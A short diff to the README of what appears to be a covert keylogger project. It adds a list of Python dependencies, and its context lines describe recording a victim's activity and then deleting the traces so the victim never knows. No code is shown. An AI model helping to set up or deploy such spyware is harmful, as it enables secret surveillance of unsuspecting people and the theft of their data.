@@ -22,6 +22,14 @@ Once this information is gathered for a specified amount of time (this can be fo
 This Key Logger will also delete the information gathered on the victims computer, so they will never know their activty was recorded in the first place.
 
 # How to get this Keylogger to work:
+Ensure you have the following pips/modules installed:
+- pywin32
+- pynput
+- cryptography
+- requests
+- pillow
+- scipy
+
 For this key logger to work, you must do the following:
 
 - Set the file path you wish to save the gathered information to , an example has been provided in the script
